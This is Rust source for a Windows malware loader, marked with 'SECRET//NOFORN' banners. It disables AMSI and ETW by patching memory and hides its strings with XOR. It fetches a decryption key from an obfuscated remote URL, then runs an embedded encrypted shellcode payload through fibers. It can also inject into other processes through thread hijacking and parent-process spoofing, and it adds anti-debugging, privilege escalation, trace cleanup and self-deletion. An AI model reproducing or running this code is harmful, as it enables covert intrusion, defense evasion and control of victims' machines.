/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

mod suicide;
mod spoof_proc;
mod find_remote;
mod remote_fiber;
mod get_privs;
#[path = "indirect_def.rs"]
pub mod def;
#[path = "indirect_utils.rs"]
pub mod utils;
#[path = "indirect_hooks.rs"]
pub mod hooks;
#[path = "indirect_syscall.rs"]
pub mod syscall;
#[path = "indirect_lib.rs"]
mod indirect_lib;
mod missed_calls;
mod nodebug;

use std::{
    ffi::c_void,
    mem,
    ptr::{self, copy_nonoverlapping},
    vec::Vec,
    time::Duration,
    thread,
};
use crate::hooks::{initialize_hooks, destroy_hooks};
pub use indirect_lib::{get_ssn_by_name, set_hw_bp};

mod benign_utils;
pub mod crypto_utils;

pub mod crypto_constants {
    include!(concat!(env!("OUT_DIR"), "/crypto_constants.rs"));
}

use windows::{
    core::{Error, PCSTR, Result},
    Win32::System::{
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{
            VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
            PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        },
        Threading::{
            ConvertThreadToFiber, CreateFiber, GetCurrentProcess, SwitchToFiber,
        },
    },
};

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let skip_checks = args.iter().any(|arg| arg == "/skip");

    // exec benign logic
    let logger = benign_utils::Logger::new();
    logger.init();
    
    let _primes = benign_utils::calculate_primes(100);
    let _s = benign_utils::harmless_string_op("initialization");

    if !skip_checks {
         if nodebug::check_debugger() {
             return Ok(());
         }
    }

    unsafe {
        initialize_hooks();
        
        let mode = if args.iter().any(|arg| arg == "/r") {
            "/r"
        } else {
            "/l" // default to local fiber
        };

        // check if spoofing flag
        let use_spoofing = args.iter().any(|arg| arg == "/s");
        // check if delete flag
        let use_delete = args.iter().any(|arg| arg == "/d");
        // check if cleanup flag
        let use_cleanup = args.iter().any(|arg| arg == "/c");

        // enable SeDebugPrivilege if admin
        let _is_admin = is_admin::is_admin();

        if _is_admin {
            match get_privs::enable_debug_privilege() {
                Ok(_) => {},
                Err(_) => {
                    println!("[-] Failed to enable debug privilege");
                },
            }
        }

        // patch AMSI
        let patch_opcode = 0x75u8;
        // "amsi.dll"
        let amsi_dll_vec = crypto_utils::xor_decrypt(
            crypto_constants::constants::AMSI_DLL_ENC, 
            crypto_constants::constants::XOR_KEY
        );
        let amsi_dll_str = std::ffi::CString::new(amsi_dll_vec).unwrap();
        
        // "AmsiScanBuffer"
        let amsi_func_vec = crypto_utils::xor_decrypt(
            crypto_constants::constants::AMSI_SCAN_ENC, 
            crypto_constants::constants::XOR_KEY
        );
        let amsi_func_str = std::ffi::CString::new(amsi_func_vec).unwrap();

        let h_module = LoadLibraryA(PCSTR(amsi_dll_str.as_ptr() as *const u8))?;

        let amsi_scan_buffer = GetProcAddress(h_module, PCSTR(amsi_func_str.as_ptr() as *const u8))
            .ok_or_else(|| Error::from_thread())? as *const u8;
        let bytes = std::slice::from_raw_parts(amsi_scan_buffer, 0x1000);
        let pattern = [0xC3, 0xCC, 0xCC];
        let mut patch_addr: *mut u8 = ptr::null_mut();
        if let Some(pos) = bytes.windows(3).position(|w| w == pattern) {
            // walk backwards looking for 'je' (0x74)
            for i in (0..pos).rev() {
                if bytes[i] == 0x74 {
                    // calculate jump target
                    let offset = bytes[i + 1] as i8;
                    let target = i as isize + 2 + offset as isize;

                    // verify target is "mov eax, 0" (0xB8)
                    if bytes.get(target as usize) == Some(&0xB8) {
                        patch_addr = amsi_scan_buffer.add(i) as *mut u8;
                        break;
                    }
                }
            }
        }
        if patch_addr.is_null() {
            // panic!("Failed: 319");
            return Ok(());
        }
        let mut old_protect;
        // make page writable
        // VirtualProtect(patch_addr, 1, RWX, &mut old) -> NtProtectVirtualMemory
        let mut base_addr = patch_addr as *mut c_void;
        let mut region_size: usize = 1;
        let mut old_prot_val: u32 = 0;

        missed_calls::nt_protect_virtual_memory(
            GetCurrentProcess().0 as *mut winapi::ctypes::c_void,
            &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
            &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE.0,
            &mut old_prot_val
        );
        old_protect = PAGE_PROTECTION_FLAGS(old_prot_val);
        // apply patch
        *patch_addr = patch_opcode;
        // restore protection
        VirtualProtect(
            patch_addr.cast::<std::ffi::c_void>(),
            1,
            old_protect,
            &mut old_protect,
        )?;

        // patch ETW
        // "ntdll.dll"
        let ntdll_dll_vec = crypto_utils::xor_decrypt(
            crypto_constants::constants::NTDLL_DLL_ENC, 
            crypto_constants::constants::XOR_KEY
        );
        let ntdll_dll_str = std::ffi::CString::new(ntdll_dll_vec).unwrap();

        // "NtTraceEvent"
        let trace_func_vec = crypto_utils::xor_decrypt(
            crypto_constants::constants::NT_TRACE_ENC, 
            crypto_constants::constants::XOR_KEY
        );
        let trace_func_str = std::ffi::CString::new(trace_func_vec).unwrap();

        let h_ntdll = LoadLibraryA(PCSTR(ntdll_dll_str.as_ptr() as *const u8))?;
        let nt_trace_addr = GetProcAddress(h_ntdll, PCSTR(trace_func_str.as_ptr() as *const u8))
            .ok_or_else(|| Error::from_thread())? as *const c_void;

        let handle = GetCurrentProcess();
        let ret_opcode: u8 = 0xC3; // ret opcode
        let size = mem::size_of_val(&ret_opcode);
        let mut _bytes_written: usize = 0;

        // WriteProcessMemory(ETW patch) -> NtWriteVirtualMemory
        let mut bytes_written_etw: usize = 0;
        missed_calls::nt_write_virtual_memory(
            handle.0 as *mut winapi::ctypes::c_void,
            nt_trace_addr as *mut winapi::ctypes::c_void,
            &ret_opcode as *const u8 as *mut winapi::ctypes::c_void,
            size,
            &mut bytes_written_etw
        );

        // load shellcode and decrypt at runtime
        let encrypted_shellcode: &[u8] = include_bytes!("enc_payload.bin");
        
        // decrypt URL
        let url_bytes: [u8; 46] = [0x2f, 0x10, 0x16, 0x41, 0x4a, 0x70, 0x4b, 0x5f, 0x5b, 0x42, 0x1f, 0x75, 0x72, 0x78, 0x0d, 0x73, 0x51, 0x4c, 0x00, 0x47, 0x6b, 0x5e, 0x56, 0x56, 0x44, 0x02, 0x6b, 0x34, 0x21, 0x44, 0x22, 0x17, 0x4d, 0x00, 0x5f, 0x2c, 0x10, 0x0f, 0x16, 0x19, 0x52, 0x6b, 0x22, 0x29, 0x4f, 0x22];
        let url_key = b"Gdb1p_dnbp1DD@#";
        let decrypted_url_vec = crypto_utils::xor_decrypt(&url_bytes, url_key);
        let decrypted_url = match String::from_utf8(decrypted_url_vec) {
            Ok(s) => s,
            Err(_) => return Ok(()),
        };

        // fetch key
        let pem_key = match crypto_utils::fetch_key(&decrypted_url) {
            Ok(k) => {
                k
            },
            Err(_) => {
                return Ok(());
            }
        };

        let shellcode = match crypto_utils::decrypt_shellcode(encrypted_shellcode, &pem_key) {
            Ok(s) => {
                println!("[+] Setup complete");
                s
            },
            Err(_) => {
                println!("[-] Failed to decrypt shellcode (Key mismatch?)");
                return Ok(());
            }
        };

        // execute based on mode
        match mode {
            "/l" => {
                // LOCAL FIBER
                if _is_admin {
                } else {
                }

                // convert current thread to fiber
                let main_fiber = ConvertThreadToFiber(None);
                if main_fiber.is_null() {
                    return Ok(());
                }

                // allocate memory as RW
                let shellcode_size = shellcode.len();
                
                let shellcode_mem = VirtualAlloc(
                    None,
                    shellcode_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );
                if shellcode_mem.is_null() {
                    println!("[-] VirtualAlloc failed");
                    return Ok(());
                }

                // write shellcode to memory
                copy_nonoverlapping(shellcode.as_ptr(), shellcode_mem as *mut u8, shellcode.len());

                // change mem protection to RX
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    shellcode_mem,
                    shellcode_size,
                    PAGE_EXECUTE_READ,
                    &mut old_protect,
                )?;
                
                println!("[+] Stager memory ready (RX). Switching to fiber...");

                // create fiber w/ shellcode addr as entry
                type FiberStartRoutine = unsafe extern "system" fn(*mut c_void);
                let shellcode_func: FiberStartRoutine = std::mem::transmute(shellcode_mem);
                let shellcode_fiber = CreateFiber(0, Some(shellcode_func), None);
                if shellcode_fiber.is_null() {
                    println!("[-] CreateFiber failed");
                    return Ok(());
                }

                // transfer execution to shellcode
                SwitchToFiber(shellcode_fiber);
                // will not reach
                println!("[!] Returned");

                if use_delete {
                    let _ = suicide::delete_self(None);
                }
            }

            "/r" => {
                // REMOTE FIBER
                
                // if admin, spoof PPID
                let mut spoofing_successful = false;

                if _is_admin && use_spoofing {
                    // find spoof parent
                    let candidates = ["spoolsv", "winlogon"];
                    let mut parent_pid_opt = None;
                    for name in candidates.iter() {
                        if let Some(pid) = find_remote::find_target_pid(name) {
                            parent_pid_opt = Some(pid);
                            break;
                        }
                    }

                    if let Some(parent_pid) = parent_pid_opt {
                        // spawn child with parent
                         match spoof_proc::spawn_spoofed_process(parent_pid, "C:\\Windows\\System32\\svchost.exe") {
                            Ok(pi) => {
                                // use new for injection
                                let h_process = pi.hProcess;
                                let h_thread = pi.hThread;

                                match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                                     Ok((addr, size)) => {
                                         // println!("[+] Success!");
                                         if use_cleanup {
                                             thread::sleep(Duration::from_millis(5000));
                                             
                                             // zero memory before return to OS
                                             let zeros = vec![0u8; size];
                                             let _ = remote_fiber::remote_write(h_process, addr, &zeros);

                                             let mut region_size: usize = 0;
                                             let mut base_addr = addr;
                                             missed_calls::nt_free_virtual_memory(
                                                h_process.0 as *mut winapi::ctypes::c_void,
                                                &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
                                                &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
                                                0x8000
                                             );
                                         }
                                         let _ = windows::Win32::Foundation::CloseHandle(h_thread);
                                         let _ = windows::Win32::Foundation::CloseHandle(h_process);
                                         spoofing_successful = true;
                                     },
                                     Err(_e) => {
                                         // println!("Failed: 1001");
                                         let _ = windows::Win32::System::Threading::TerminateProcess(h_process, 0);
                                     }
                                }
                            },
                            Err(_e) => {
                                // println!("Failed: 1002");
                            }
                        }
                    } else {
                        // println!("[-] Processes not found!");
                    }
                }
                
                // if spoof worked, suicide and exit
                if spoofing_successful {
                    if use_delete {
                        let _ = suicide::delete_self(None);
                    }
                    return Ok(());
                }

                // if spoof did not work, fallback
                if _is_admin {
                     // println!("[+] Initialized!");
                }
                
                // find target process
                let target_pid = if _is_admin {
                    match find_remote::find_target_pid("explorer") {
                        Some(pid) => pid,
                        None => return Ok(()),
                    }
                } else {
                    // find user process
                    match find_remote::find_user_process_pid() {
                        Some(pid) => pid,
                        None => return Ok(()),
                    }
                };
                
                // enum all threads in target process
                let thread_ids = find_remote::find_all_remote_thread_ids(target_pid);
                if thread_ids.is_empty() {
                    // panic!("Failed: 902");
                    return Ok(());
                }

                // open process handle once
                let h_process = remote_fiber::open_target_process(target_pid)?;
                let mut injection_success = false;

                // try each thread until one succeeds
                for (_idx, &thread_id) in thread_ids.iter().enumerate() {
                    let h_thread = match remote_fiber::open_target_thread(thread_id) {
                        Ok(handle) => handle,
                        Err(_) => continue,
                    };

                    match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                        Ok((addr, size)) => {
                                 if use_cleanup {
                                     thread::sleep(Duration::from_millis(5000));
                                     
                                     // zero out memory first
                                     let zeros = vec![0u8; size];
                                     let _ = remote_fiber::remote_write(h_process, addr, &zeros);

                                     let mut region_size: usize = 0;
                                     let mut base_addr = addr;
                                     missed_calls::nt_free_virtual_memory(
                                        h_process.0 as *mut winapi::ctypes::c_void,
                                        &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
                                        &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
                                        0x8000
                                     );
                            }
                            let _ = remote_fiber::close_thread_handle(h_thread);
                            injection_success = true;
                            break;
                        }
                        Err(_e) => {
                            let _ = remote_fiber::close_thread_handle(h_thread);
                            continue;
                        }
                    }
                }

                let _ = remote_fiber::close_process_handle(h_process);

                if !injection_success {
                    // panic!("Failed: 903");
                    return Ok(());
                }

                // attempt self-delete
                if use_delete {
                    let _ = suicide::delete_self(None);
                }
            }

            _ => {
                // panic!("Failed: 900");
                return Ok(());
            }
        }
        destroy_hooks();
    }
    Ok(())
}


/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/